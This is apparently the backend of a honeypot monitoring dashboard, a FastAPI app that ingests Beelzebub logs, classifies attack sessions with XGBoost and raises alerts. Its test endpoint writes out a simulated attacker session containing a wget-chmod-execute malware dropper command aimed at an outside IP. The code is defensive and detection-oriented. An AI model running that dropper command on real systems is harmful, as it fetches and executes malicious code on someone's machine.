import asyncio
import json
import os
import queue
import re
import sqlite3
import subprocess
import threading
import time
from contextlib import asynccontextmanager
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Optional, List, Dict

# Starlette compatibility patch
try:
    import starlette.routing
    _orig_router_init = starlette.routing.Router.__init__
    def _safe_router_init(self, *args, **kwargs):
        # Remove on_startup / on_shutdown if not supported in kwargs
        if "on_startup" in kwargs or "on_shutdown" in kwargs:
            import inspect
            sig = inspect.signature(_orig_router_init)
            if "on_startup" not in sig.parameters:
                kwargs.pop("on_startup", None)
                kwargs.pop("on_shutdown", None)
        return _orig_router_init(self, *args, **kwargs)
    starlette.routing.Router.__init__ = _safe_router_init
except Exception:
    pass

from fastapi import FastAPI, Query, Body, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse, Response, JSONResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from starlette.requests import Request

from ml_engine import HoneypotMLEngine

APP_DIR = Path(__file__).resolve().parent
DB_PATH = Path(os.getenv("DB_PATH", str(APP_DIR / "data" / "events.db")))
POLL_INTERVAL = int(os.getenv("POLL_INTERVAL", "2"))
DB_PATH.parent.mkdir(parents=True, exist_ok=True)

# Khởi tạo Bộ Máy ML (Python / XGBoost)
ml_engine = HoneypotMLEngine(artifacts_dir=str(APP_DIR / "artifacts"))
ml_task_queue: queue.Queue = queue.Queue()

# Trạng thái Cảnh báo Đỏ (Red Alert Alarm State)
latest_alert = {
    "has_alert": False,
    "alert_id": 0,
    "session_id": "",
    "source_ip": "",
    "attack_type": "",
    "confidence": 0.0,
    "alert_level": "NORMAL",
    "risk_score": 0,
    "message": "",
    "timestamp": ""
}

SENSITIVE_KEYS = {
    "password", "passwd", "authorization", "token", "secret", "cookie",
    "cookies", "environ", "environment", "apikey", "api_key"
}

def redact(value: Any, key: str = "") -> Any:
    if key.lower() in SENSITIVE_KEYS:
        return "[REDACTED]"
    if isinstance(value, dict):
        return {k: redact(v, str(k)) for k, v in value.items()}
    if isinstance(value, list):
        return [redact(v, key) for v in value]
    return value

def db_connect():
    conn = sqlite3.connect(DB_PATH, timeout=15)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA foreign_keys=ON")
    return conn

def init_db():
    with db_connect() as conn:
        conn.execute("""
        CREATE TABLE IF NOT EXISTS events (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            event_key TEXT UNIQUE NOT NULL,
            timestamp TEXT,
            source_ip TEXT,
            source_port INTEGER,
            protocol TEXT,
            session_id TEXT,
            event_status TEXT,
            message TEXT,
            command TEXT,
            command_output TEXT,
            username TEXT,
            service_description TEXT,
            http_method TEXT,
            request_uri TEXT,
            user_agent TEXT,
            body TEXT,
            raw_level TEXT,
            raw_json TEXT NOT NULL,
            ingested_at TEXT NOT NULL
        )
        """)
        conn.execute("CREATE INDEX IF NOT EXISTS idx_events_timestamp ON events(timestamp)")
        conn.execute("CREATE INDEX IF NOT EXISTS idx_events_ip ON events(source_ip)")
        conn.execute("CREATE INDEX IF NOT EXISTS idx_events_protocol ON events(protocol)")
        conn.execute("CREATE INDEX IF NOT EXISTS idx_events_status ON events(event_status)")
        conn.execute("CREATE INDEX IF NOT EXISTS idx_events_session ON events(session_id)")

        # Bảng lưu kết quả dự đoán từ Bộ máy ML (XGBoost)
        conn.execute("""
        CREATE TABLE IF NOT EXISTS ml_predictions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id TEXT UNIQUE NOT NULL,
            source_ip TEXT,
            attack_type TEXT NOT NULL,
            class_en TEXT NOT NULL,
            confidence REAL NOT NULL,
            alert_level TEXT NOT NULL,
            risk_score INTEGER NOT NULL,
            is_critical_alarm INTEGER NOT NULL,
            features_json TEXT NOT NULL,
            commands_json TEXT NOT NULL,
            analyzed_at TEXT NOT NULL
        )
        """)
        conn.execute("CREATE INDEX IF NOT EXISTS idx_ml_session ON ml_predictions(session_id)")
        conn.execute("CREATE INDEX IF NOT EXISTS idx_ml_risk ON ml_predictions(risk_score)")

def get_candidate_log_files():
    candidates = []
    env_file = os.getenv("BEELZEBUB_LOG_FILE") or os.getenv("LOG_FILE")
    if env_file:
        candidates.append(Path(env_file))
    candidates.extend([
        APP_DIR / "logs" / "beelzebub.json",
        APP_DIR.parent / "logs" / "beelzebub.json",
        APP_DIR / "beelzebub.json",
        APP_DIR.parent / "beelzebub.json",
        APP_DIR / "deploy" / "beelzebub" / "logs" / "beelzebub.json",
        Path("/var/log/beelzebub/beelzebub.json"),
        Path("/var/log/beelzebub.json"),
        APP_DIR / "data" / "raw" / "beelzebub_sample.json",
        APP_DIR.parent / "data" / "raw" / "beelzebub_sample.json",
    ])
    logs_dir = APP_DIR / "logs"
    if logs_dir.is_dir():
        for f in logs_dir.glob("*.json"):
            if f not in candidates:
                candidates.append(f)
    return [p for p in candidates if p.is_file()]

def get_target_container() -> str:
    env_name = os.getenv("BEELZEBUB_CONTAINER")
    if env_name:
        return env_name

    for name in ["beelzebub", "beelzebub-honeypot"]:
        try:
            res = subprocess.run(["docker", "inspect", name], capture_output=True, text=True, timeout=3)
            if res.returncode == 0:
                return name
        except Exception:
            pass

    try:
        res = subprocess.run(["docker", "ps", "--format", "{{.Names}}"], capture_output=True, text=True, timeout=4)
        if res.returncode == 0 and res.stdout.strip():
            for line in res.stdout.strip().splitlines():
                c = line.strip()
                if "beelzebub" in c.lower() or "honeypot" in c.lower():
                    return c
    except Exception:
        pass

    return "beelzebub"

def get_field(data: dict, fallback_data: Optional[dict], *candidates) -> Any:
    for target in (data, fallback_data or {}):
        if not isinstance(target, dict):
            continue
        for key in candidates:
            if key in target and target[key] not in (None, ""):
                return target[key]
        lower_map = {str(k).lower(): v for k, v in target.items() if v not in (None, "")}
        for key in candidates:
            if key.lower() in lower_map:
                return lower_map[key.lower()]
    return None

def parse_record(line: str) -> Optional[dict]:
    if not line or not line.strip():
        return None

    clean_line = re.sub(r'\x1b\[[0-9;]*[a-zA-Z]', '', line.strip())
    start_idx = clean_line.find("{")
    end_idx = clean_line.rfind("}")
    if start_idx == -1 or end_idx == -1 or end_idx <= start_idx:
        return None

    try:
        record = json.loads(clean_line[start_idx : end_idx + 1], strict=False)
    except Exception:
        return None

    if not isinstance(record, dict):
        return None

    event = record.get("event")
    if not isinstance(event, dict):
        if isinstance(record.get("data"), dict):
            event = record["data"]
        elif isinstance(record.get("payload"), dict):
            event = record["payload"]
        else:
            event = record

    event = redact(event)

    source_ip = get_field(event, record, "SourceIp", "source_ip", "src_ip", "SourceIP", "remote_ip", "client_ip", "ip")
    source_port = get_field(event, record, "SourcePort", "source_port", "src_port", "port", "remote_port")
    remote_addr = get_field(event, record, "RemoteAddr", "remote_addr", "RemoteAddress", "addr")

    if (source_ip is None or source_port is None) and isinstance(remote_addr, str) and ":" in remote_addr:
        host, port = remote_addr.rsplit(":", 1)
        source_ip = source_ip or host.strip("[]")
        if source_port is None:
            source_port = port

    try:
        source_port = int(source_port) if source_port not in (None, "") else None
    except (ValueError, TypeError):
        source_port = None

    event_id = get_field(event, record, "SessionID", "session_id", "session", "sessionId", "ID", "id", "session_uuid")
    timestamp = get_field(event, record, "DateTime", "datetime", "timestamp", "time", "date_time", "@timestamp", "ts")
    if not timestamp:
        timestamp = datetime.now(timezone.utc).isoformat()

    event_status = get_field(event, record, "Status", "status", "event_status", "action", "state")
    message = get_field(event, record, "Msg", "msg", "message", "Message", "text", "event_type")
    command = get_field(event, record, "Command", "command", "cmd", "input")
    command_output = get_field(event, record, "CommandOutput", "command_output", "response", "output", "cmd_output")
    username = get_field(event, record, "Username", "username", "User", "user", "login")
    service_desc = get_field(event, record, "Description", "description", "service_description", "service_desc")
    http_method = get_field(event, record, "HTTPMethod", "http_method", "method")
    request_uri = get_field(event, record, "RequestURI", "request_uri", "uri", "url", "path")
    user_agent = get_field(event, record, "UserAgent", "user_agent", "User-Agent", "useragent")
    body = get_field(event, record, "Body", "body", "data", "post_data")
    protocol = get_field(event, record, "Protocol", "protocol", "proto", "service") or "ssh"

    has_activity = any([
        source_ip, remote_addr, command, event_id, username,
        "event" in record, request_uri, event_status
    ])
    if not has_activity:
        return None

    parts = [str(timestamp or ""), str(source_ip or ""), str(event_id or ""), str(command or ""), str(event_status or "")]
    event_key = ":".join(parts)
    if event_key.strip(":") == "":
        event_key = f"{datetime.now(timezone.utc).timestamp()}:{json.dumps(event, sort_keys=True)}"

    return {
        "event_key": event_key,
        "timestamp": str(timestamp),
        "source_ip": str(source_ip) if source_ip else None,
        "source_port": source_port,
        "protocol": str(protocol),
        "session_id": str(event_id) if event_id else None,
        "event_status": str(event_status) if event_status else None,
        "message": str(message) if message else None,
        "command": str(command) if command else None,
        "command_output": str(command_output) if command_output else None,
        "username": str(username) if username else None,
        "service_description": str(service_desc) if service_desc else None,
        "http_method": str(http_method) if http_method else None,
        "request_uri": str(request_uri) if request_uri else None,
        "user_agent": str(user_agent) if user_agent else None,
        "body": str(body) if body else None,
        "raw_level": str(record.get("level")) if record.get("level") else None,
        "raw_json": json.dumps(redact(record), ensure_ascii=False),
        "ingested_at": datetime.now(timezone.utc).isoformat()
    }

def run_session_ml_analysis(session_id: str) -> Optional[Dict[str, Any]]:
    """
    Vòng lặp 2: PHÂN TÍCH & PHÂN LOẠI ML (DETECTION PIPELINE)
    Bước 12: Gộp tất cả sự kiện có cùng Session ID
    Bước 13: Trích xuất vector 14 đặc trưng
    Bước 14: Nạp vào XGBoost.predict()
    Bước 15: Đẩy kết quả phân loại sang Dashboard
    """
    global latest_alert
    if not session_id:
        return None

    try:
        with db_connect() as conn:
            rows = conn.execute(
                "SELECT * FROM events WHERE session_id = ? ORDER BY id ASC",
                (session_id,)
            ).fetchall()

        if not rows:
            return None

        events_list = [dict(r) for r in rows]
        src_ip = events_list[0].get("source_ip") or "Unknown"

        # Phân tích qua ml_engine
        result = ml_engine.analyze_session(events_list)

        # Lưu hoặc cập nhật kết quả ML vào database
        with db_connect() as conn:
            conn.execute("""
            INSERT INTO ml_predictions (
                session_id, source_ip, attack_type, class_en, confidence,
                alert_level, risk_score, is_critical_alarm, features_json, commands_json, analyzed_at
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ON CONFLICT(session_id) DO UPDATE SET
                source_ip = excluded.source_ip,
                attack_type = excluded.attack_type,
                class_en = excluded.class_en,
                confidence = excluded.confidence,
                alert_level = excluded.alert_level,
                risk_score = excluded.risk_score,
                is_critical_alarm = excluded.is_critical_alarm,
                features_json = excluded.features_json,
                commands_json = excluded.commands_json,
                analyzed_at = excluded.analyzed_at
            """, (
                session_id,
                src_ip,
                result["prediction_vi"],
                result["prediction_en"],
                result["confidence_pct"],
                result["alert_level"],
                result["risk_score"],
                1 if result["is_critical_alarm"] else 0,
                json.dumps(result["features_14"], ensure_ascii=False),
                json.dumps(result["commands_analyzed"], ensure_ascii=False),
                result["analyzed_at"]
            ))

        print(f"[ML Pipeline] Analyzed Session '{session_id}': [{result['prediction_en']} - Conf: {result['confidence_pct']}%] (Level: {result['alert_level']})", flush=True)

        # Nếu là tấn công nguy hiểm (Exploit / Dropper) -> Kích hoạt Chuông Cảnh Báo Đỏ
        if result["is_critical_alarm"]:
            latest_alert = {
                "has_alert": True,
                "alert_id": int(time.time() * 1000),
                "session_id": session_id,
                "source_ip": src_ip,
                "attack_type": result["prediction_vi"],
                "confidence": result["confidence_pct"],
                "alert_level": result["alert_level"],
                "risk_score": result["risk_score"],
                "message": f"Detected {result['prediction_en']} from {src_ip} (Conf: {result['confidence_pct']}%)",
                "timestamp": datetime.now(timezone.utc).isoformat()
            }
            print(f"[ALARM SIREN] RED ALERT SIREN ACTIVATED! {latest_alert['message']}", flush=True)

        return result
    except Exception as exc:
        print(f"[ML Error] Error analyzing session {session_id}: {exc}", flush=True)
        return None

def ml_worker_loop(stop_event: threading.Event):
    """Worker luồng nền để xử lý hàng đợi phân loại ML mà không chặn ingestion."""
    while not stop_event.is_set():
        try:
            session_id = ml_task_queue.get(timeout=1.0)
            if session_id:
                run_session_ml_analysis(session_id)
                ml_task_queue.task_done()
        except queue.Empty:
            continue
        except Exception as e:
            print(f"[ML Worker] Lỗi xử lý hàng đợi: {e}", flush=True)

def is_session_closing_event(event_dict: dict) -> bool:
    """Bước 11: Phát hiện phiên vừa kết thúc (Session Closed, exit, logout, disconnect)."""
    status = str(event_dict.get("event_status") or "").lower()
    msg = str(event_dict.get("message") or "").lower()
    cmd = str(event_dict.get("command") or "").strip().lower()

    if status in ("session_closed", "closed", "end", "disconnect", "disconnected", "logout", "session_end"):
        return True
    if "session closed" in msg or "disconnect" in msg or "connection closed" in msg:
        return True
    if cmd == "exit" or cmd == "logout":
        return True
    return False

def insert_event(item: dict) -> bool:
    columns = list(item.keys())
    placeholders = ",".join("?" for _ in columns)
    with db_connect() as conn:
        cur = conn.execute(
            f"INSERT OR IGNORE INTO events ({','.join(columns)}) VALUES ({placeholders})",
            [item[c] for c in columns]
        )
        inserted = cur.rowcount > 0

    if inserted and item.get("session_id"):
        sid = item["session_id"]
        # Nếu là sự kiện kết thúc phiên hoặc lệnh nguy hiểm -> Đưa vào hàng đợi phân loại ML
        if is_session_closing_event(item) or item.get("command"):
            ml_task_queue.put(sid)

    return inserted

def docker_parser_loop(stop_event: threading.Event):
    while not stop_event.is_set():
        container = get_target_container()
        since_val = os.getenv("LOG_SINCE")
        if since_val:
            cmd = ["docker", "logs", "--follow", "--since", since_val, container]
        else:
            cmd = ["docker", "logs", "--follow", "--tail", "2000", container]

        try:
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1
            )
            assert proc.stdout is not None

            for line in proc.stdout:
                if stop_event.is_set():
                    break
                parsed = parse_record(line)
                if parsed:
                    try:
                        if insert_event(parsed):
                            pass
                    except sqlite3.Error as exc:
                        print(f"[parser] Database error: {exc}", flush=True)

            proc.terminate()
            try:
                proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                proc.kill()

        except FileNotFoundError:
            pass
        except Exception:
            pass

        stop_event.wait(POLL_INTERVAL)

def file_parser_loop(stop_event: threading.Event):
    """Bước 11: File Watcher theo dõi file beelzebub.json và phát hiện sự kiện mới."""
    file_offsets = {}
    while not stop_event.is_set():
        files = get_candidate_log_files()
        for fpath in files:
            p_str = str(fpath)
            try:
                curr_size = fpath.stat().st_size
                last_offset = file_offsets.get(p_str, 0)
                if curr_size > last_offset:
                    with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                        f.seek(last_offset)
                        for line in f:
                            parsed = parse_record(line)
                            if parsed:
                                try:
                                    if insert_event(parsed):
                                        print(f"[File Watcher] + Ingested from {fpath.name}: IP: {parsed['source_ip']} | Cmd: {parsed['command'] or parsed['event_status']}", flush=True)
                                except sqlite3.Error as exc:
                                    print(f"[File Watcher] DB Error: {exc}", flush=True)
                        file_offsets[p_str] = f.tell()
                elif curr_size < last_offset:
                    file_offsets[p_str] = 0
            except Exception:
                pass
        stop_event.wait(POLL_INTERVAL)

@asynccontextmanager
async def lifespan(app: FastAPI):
    init_db()
    stop_event = threading.Event()
    t_docker = threading.Thread(target=docker_parser_loop, args=(stop_event,), daemon=True)
    t_file = threading.Thread(target=file_parser_loop, args=(stop_event,), daemon=True)
    t_ml = threading.Thread(target=ml_worker_loop, args=(stop_event,), daemon=True)
    
    t_docker.start()
    t_file.start()
    t_ml.start()

    # Tự động nạp và phân tích dữ liệu mẫu nếu database đang trống
    with db_connect() as conn:
        cnt = conn.execute("SELECT COUNT(*) FROM events").fetchone()[0]
    if cnt == 0:
        for fpath in get_candidate_log_files():
            if fpath.is_file():
                print(f"[Startup] Khởi tạo dữ liệu từ file: {fpath.name}", flush=True)
                with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        rec = parse_record(line)
                        if rec:
                            insert_event(rec)
                break

    app.state.stop_event = stop_event
    app.state.workers = [t_docker, t_file, t_ml]
    yield
    stop_event.set()
    t_docker.join(timeout=3)
    t_file.join(timeout=3)
    t_ml.join(timeout=3)

app = FastAPI(
    title="Beelzebub SOC Dashboard & ML Detection Engine",
    description="Hệ thống Phát hiện & Phân loại Tấn công Honeypot sử dụng XGBoost kết hợp Giao diện Giám sát SOC thời gian thực",
    version="2.0.0",
    lifespan=lifespan
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.middleware("http")
async def add_no_cache_headers(request: Request, call_next):
    response = await call_next(request)
    if request.url.path.startswith("/api/"):
        response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
        response.headers["Pragma"] = "no-cache"
        response.headers["Expires"] = "0"
    return response

app.mount("/static", StaticFiles(directory=APP_DIR / "static"), name="static")
templates = Jinja2Templates(directory=str(APP_DIR / "templates"))

@app.get("/", response_class=HTMLResponse)
def dashboard(request: Request):
    try:
        return templates.TemplateResponse(request=request, name="index.html")
    except TypeError:
        return templates.TemplateResponse("index.html", {"request": request})

# ==============================================================================
# API TIẾP NHẬN DỮ LIỆU TỪ VM 1 (INGESTION API: VM1 -> VM2)
# ==============================================================================

@app.post("/api/ingest")
async def ingest_from_vm1(request: Request):
    """
    Điểm tiếp nhận sự kiện từ VM 1 (Honeypot Sensor) chuyển sang VM 2 (ML + Dashboard).
    Hỗ trợ nhận raw log line, parsed JSON dict hoặc mảng các sự kiện.
    """
    try:
        data = await request.json()
    except Exception:
        body_bytes = await request.body()
        data = {"raw_line": body_bytes.decode("utf-8", errors="ignore")}

    records_to_process = []
    if isinstance(data, list):
        records_to_process = data
    elif isinstance(data, dict):
        if "raw_line" in data and isinstance(data["raw_line"], str):
            p = parse_record(data["raw_line"])
            if p:
                records_to_process.append(p)
        elif "parsed" in data and isinstance(data["parsed"], dict):
            p = parse_record(json.dumps(data["parsed"]))
            if p:
                records_to_process.append(p)
        else:
            p = parse_record(json.dumps(data))
            if p:
                records_to_process.append(p)

    ingested_count = 0
    sessions_touched = set()

    for item in records_to_process:
        if insert_event(item):
            ingested_count += 1
            if item.get("session_id"):
                sessions_touched.add(item["session_id"])

    return {
        "status": "ok",
        "ingested_count": ingested_count,
        "sessions_queued_for_ml": list(sessions_touched)
    }

# ==============================================================================
# API BỘ MÁY ML & CẢNH BÁO ĐỎ (ML DETECTION & RED ALARM)
# ==============================================================================

@app.get("/api/ml/latest-alert")
def get_latest_alert():
    """Lấy cảnh báo đỏ mới nhất phục vụ bật chuông báo động & chớp đỏ trên Dashboard."""
    return latest_alert

@app.post("/api/ml/dismiss-alert")
def dismiss_alert():
    """Tắt / Xác nhận chuông cảnh báo đỏ."""
    global latest_alert
    latest_alert["has_alert"] = False
    return {"status": "ok", "message": "Đã tắt chuông cảnh báo."}

@app.get("/api/ml/predictions")
def get_ml_predictions(limit: int = 50):
    """Lấy danh sách các phiên tấn công đã được XGBoost phân loại."""
    with db_connect() as conn:
        rows = conn.execute("""
            SELECT id, session_id, source_ip, attack_type, class_en,
                   confidence, alert_level, risk_score, is_critical_alarm,
                   features_json, commands_json, analyzed_at
            FROM ml_predictions
            ORDER BY id DESC LIMIT ?
        """, (limit,)).fetchall()

    results = []
    for r in rows:
        it = dict(r)
        try:
            it["features"] = json.loads(it["features_json"])
            it["commands"] = json.loads(it["commands_json"])
        except Exception:
            pass
        results.append(it)
    return results

@app.get("/api/ml/stats")
def get_ml_stats():
    """Thống kê tổng hợp phân loại ML phục vụ biểu đồ SOC."""
    with db_connect() as conn:
        distribution = [dict(r) for r in conn.execute("""
            SELECT attack_type AS label, COUNT(*) AS value,
                   ROUND(AVG(confidence), 1) AS avg_confidence,
                   MAX(alert_level) AS max_alert
            FROM ml_predictions
            GROUP BY attack_type
            ORDER BY value DESC
        """).fetchall()]

        critical_count = conn.execute(
            "SELECT COUNT(*) FROM ml_predictions WHERE alert_level = 'CRITICAL' OR risk_score >= 90"
        ).fetchone()[0]

        total_analyzed = conn.execute("SELECT COUNT(*) FROM ml_predictions").fetchone()[0]

    return {
        "total_analyzed_sessions": total_analyzed,
        "critical_attacks_count": critical_count,
        "attack_distribution": distribution
    }

@app.get("/api/sessions/{session_id}/ml")
def get_session_ml_detail(session_id: str):
    """Xem chi tiết 14 vector đặc trưng và phân tích XGBoost của phiên chỉ định."""
    with db_connect() as conn:
        row = conn.execute(
            "SELECT * FROM ml_predictions WHERE session_id = ?",
            (session_id,)
        ).fetchone()

    if row:
        it = dict(row)
        try:
            it["features"] = json.loads(it["features_json"])
            it["commands"] = json.loads(it["commands_json"])
        except Exception:
            pass
        return it

    # Nếu chưa có trong bảng ml_predictions, chạy phân tích trực tiếp ngay
    analysis = run_session_ml_analysis(session_id)
    if analysis:
        return analysis
    return {"error": "session_not_found"}

# ==============================================================================
# SIMULATION TEST: KỊCH BẢN TẤN CÔNG EXPLOIT & BẬT CHUÔNG CẢNH BÁO ĐỎ
# ==============================================================================

@app.post("/api/test/exploit")
def test_exploit_attack():
    """
    Tạo giả lập 1 phiên tấn công Exploit thực tế (Kali Linux SSH -> Download malware -> Exit)
    để kiểm thử toàn diện Bước 11-16: ML phân loại 'Tấn công Exploit - Tin cậy 98.5%' và BẬT CHUÔNG BÁO ĐỘNG ĐỎ.
    """
    now = datetime.now(timezone.utc)
    sess_id = f"kali-exploit-{int(now.timestamp())}"
    src_ip = "192.168.1.188"

    test_events = [
        # 1. Đăng nhập SSH
        {
            "event_key": f"{sess_id}:1",
            "timestamp": now.isoformat(),
            "source_ip": src_ip,
            "source_port": 54210,
            "protocol": "ssh",
            "session_id": sess_id,
            "event_status": "login_success",
            "message": "SSH login accepted",
            "command": "",
            "command_output": "",
            "username": "root",
            "service_description": "SSH AI Deception Shell",
            "http_method": None,
            "request_uri": None,
            "user_agent": None,
            "body": None,
            "raw_level": "info",
            "raw_json": json.dumps({"kali_test": True, "step": "login"}),
            "ingested_at": now.isoformat()
        },
        # 2. Gõ lệnh do thám ban đầu
        {
            "event_key": f"{sess_id}:2",
            "timestamp": now.isoformat(),
            "source_ip": src_ip,
            "source_port": 54210,
            "protocol": "ssh",
            "session_id": sess_id,
            "event_status": "command",
            "message": "Executed command",
            "command": "uname -a",
            "command_output": "Linux beelzebub-ai-node 5.15.0-88-generic #98-Ubuntu SMP x86_64",
            "username": "root",
            "service_description": "AI Shell Interaction",
            "http_method": None,
            "request_uri": None,
            "user_agent": None,
            "body": None,
            "raw_level": "info",
            "raw_json": json.dumps({"kali_test": True, "step": "recon"}),
            "ingested_at": now.isoformat()
        },
        # 3. Gõ lệnh Exploit / Tải mã độc Dropper (wget malware.sh && chmod 777 && ./malware.sh)
        {
            "event_key": f"{sess_id}:3",
            "timestamp": now.isoformat(),
            "source_ip": src_ip,
            "source_port": 54210,
            "protocol": "ssh",
            "session_id": sess_id,
            "event_status": "command",
            "message": "Executed command",
            "command": "wget http://185.220.101.5/malware.sh && chmod 777 malware.sh && ./malware.sh",
            "command_output": "Connecting to 185.220.101.5:80... connected.\nHTTP request sent, awaiting response... 200 OK\nSaving to: 'malware.sh'\n[100%] malware.sh saved [14280/14280]",
            "username": "root",
            "service_description": "AI Shell Interaction",
            "http_method": None,
            "request_uri": None,
            "user_agent": None,
            "body": None,
            "raw_level": "warning",
            "raw_json": json.dumps({"kali_test": True, "step": "exploit"}),
            "ingested_at": now.isoformat()
        },
        # 4. Gõ exit -> Đóng phiên (Session Closed)
        {
            "event_key": f"{sess_id}:4",
            "timestamp": now.isoformat(),
            "source_ip": src_ip,
            "source_port": 54210,
            "protocol": "ssh",
            "session_id": sess_id,
            "event_status": "session_closed",
            "message": "Attacker exited terminal - Session Closed",
            "command": "exit",
            "command_output": "logout\nConnection to honeypot closed.",
            "username": "root",
            "service_description": "Session Closed",
            "http_method": None,
            "request_uri": None,
            "user_agent": None,
            "body": None,
            "raw_level": "info",
            "raw_json": json.dumps({"kali_test": True, "step": "close"}),
            "ingested_at": now.isoformat()
        }
    ]

    for ev in test_events:
        insert_event(ev)

    # Chạy phân tích ML ngay lập tức
    analysis = run_session_ml_analysis(sess_id)

    return {
        "status": "ok",
        "message": "Đã tạo phiên tấn công mô phỏng Exploit và kích hoạt Chuông Cảnh Báo Đỏ!",
        "session_id": sess_id,
        "ml_result": analysis
    }

# ==============================================================================
# CÁC ENDPOINT MONITORING & THỐNG KÊ GỐC CỦA DASHBOARD
# ==============================================================================

@app.get("/api/health")
def health():
    container = get_target_container()
    docker_ok = False
    try:
        docker_ok = subprocess.run(["docker", "inspect", container], capture_output=True, text=True, timeout=3).returncode == 0
    except Exception:
        pass

    with db_connect() as conn:
        count = conn.execute("SELECT COUNT(*) FROM events").fetchone()[0]
        ml_count = conn.execute("SELECT COUNT(*) FROM ml_predictions").fetchone()[0]

    found_files = [str(p) for p in get_candidate_log_files()]

    return {
        "status": "ok",
        "node_role": "VM2 - ML & SOC Dashboard",
        "database": str(DB_PATH),
        "container_name": container,
        "docker_container_found": docker_ok,
        "log_files_found": found_files,
        "events_total": count,
        "ml_analyzed_sessions": ml_count,
        "latest_alarm": latest_alert["has_alert"]
    }

@app.get("/api/stats")
def stats():
    with db_connect() as conn:
        total = conn.execute("SELECT COUNT(*) FROM events").fetchone()[0]
        last_24h = conn.execute("""
            SELECT COUNT(*) FROM events
            WHERE timestamp IS NOT NULL AND datetime(timestamp) >= datetime('now', '-1 day')
        """).fetchone()[0]
        unique_ips = conn.execute("SELECT COUNT(DISTINCT source_ip) FROM events WHERE source_ip IS NOT NULL").fetchone()[0]
        sessions = conn.execute("SELECT COUNT(DISTINCT session_id) FROM events WHERE session_id IS NOT NULL").fetchone()[0]

        # Thống kê phân loại tấn công từ ML
        ml_attacks = [dict(r) for r in conn.execute("""
            SELECT attack_type AS label, COUNT(*) AS value, ROUND(AVG(confidence), 1) AS confidence
            FROM ml_predictions
            GROUP BY attack_type
            ORDER BY value DESC LIMIT 6
        """).fetchall()]

        protocols = [dict(r) for r in conn.execute("""
            SELECT COALESCE(protocol, 'Unknown') AS label, COUNT(*) AS value
            FROM events GROUP BY COALESCE(protocol, 'Unknown')
            ORDER BY value DESC LIMIT 8
        """).fetchall()]
        statuses = [dict(r) for r in conn.execute("""
            SELECT COALESCE(event_status, 'Unknown') AS label, COUNT(*) AS value
            FROM events GROUP BY COALESCE(event_status, 'Unknown')
            ORDER BY value DESC
        """).fetchall()]
        top_ips = [dict(r) for r in conn.execute("""
            SELECT source_ip AS ip, COUNT(*) AS count, MAX(timestamp) AS last_seen
            FROM events WHERE source_ip IS NOT NULL
            GROUP BY source_ip ORDER BY count DESC LIMIT 8
        """).fetchall()]
        timeline = [dict(r) for r in conn.execute("""
            SELECT substr(timestamp, 1, 13) AS hour, COUNT(*) AS count
            FROM events WHERE timestamp IS NOT NULL
              AND datetime(timestamp) >= datetime('now', '-24 hours')
            GROUP BY hour ORDER BY hour
        """).fetchall()]

    return {
        "total_events": total,
        "events_24h": last_24h,
        "unique_ips": unique_ips,
        "sessions": sessions,
        "ml_attacks": ml_attacks,
        "protocols": protocols,
        "statuses": statuses,
        "top_ips": top_ips,
        "timeline": timeline
    }

@app.get("/api/events")
def events(
    q: str = Query("", max_length=200),
    protocol: str = Query("", max_length=40),
    status: str = Query("", max_length=40),
    ip: str = Query("", max_length=100),
    limit: int = Query(100, ge=1, le=500),
    offset: int = Query(0, ge=0)
):
    clauses, args = [], []
    if q:
        clauses.append("(e.source_ip LIKE ? OR e.message LIKE ? OR e.command LIKE ? OR e.username LIKE ? OR e.request_uri LIKE ?)")
        pattern = f"%{q}%"
        args.extend([pattern] * 5)
    if protocol:
        clauses.append("e.protocol = ?"); args.append(protocol)
    if status:
        clauses.append("e.event_status = ?"); args.append(status)
    if ip:
        clauses.append("e.source_ip LIKE ?"); args.append(f"%{ip}%")
    where = (" WHERE " + " AND ".join(clauses)) if clauses else ""

    with db_connect() as conn:
        total = conn.execute("SELECT COUNT(*) FROM events e" + where, args).fetchone()[0]
        # LEFT JOIN với ml_predictions để hiển thị nhãn ML ngay trên từng dòng event
        query = f"""
            SELECT e.id, e.timestamp, e.source_ip, e.source_port, e.protocol,
                   e.session_id, e.event_status, e.message, e.command, e.command_output,
                   e.username, e.service_description, e.http_method, e.request_uri, e.user_agent,
                   m.attack_type AS ml_prediction, m.confidence AS ml_confidence, m.alert_level AS ml_alert_level
            FROM events e
            LEFT JOIN ml_predictions m ON e.session_id = m.session_id
            {where}
            ORDER BY e.id DESC LIMIT ? OFFSET ?
        """
        rows = conn.execute(query, args + [limit, offset]).fetchall()

    return {"total": total, "limit": limit, "offset": offset, "items": [dict(r) for r in rows]}

@app.get("/api/events/export")
def export_events(format: str = Query("json")):
    with db_connect() as conn:
        rows = conn.execute("SELECT * FROM events ORDER BY id ASC").fetchall()
    items = []
    for r in rows:
        it = dict(r)
        try:
            it["raw_json"] = json.loads(it["raw_json"])
        except Exception:
            pass
        items.append(it)

    if format == "jsonl":
        content = "\n".join(json.dumps(it, ensure_ascii=False) for it in items)
        return Response(content=content, media_type="application/x-ndjson",
                        headers={"Content-Disposition": "attachment; filename=beelzebub-events.jsonl"})

    content = json.dumps(items, indent=2, ensure_ascii=False)
    return Response(content=content, media_type="application/json",
                    headers={"Content-Disposition": "attachment; filename=beelzebub-events.json"})

@app.get("/api/events/{event_id}")
def event_detail(event_id: int):
    with db_connect() as conn:
        row = conn.execute("SELECT * FROM events WHERE id = ?", (event_id,)).fetchone()
    if not row:
        return {"error": "not_found"}
    item = dict(row)
    try:
        item["raw_json"] = json.loads(item["raw_json"])
    except Exception:
        pass

    # Kèm thông tin ML nếu có
    if item.get("session_id"):
        with db_connect() as conn:
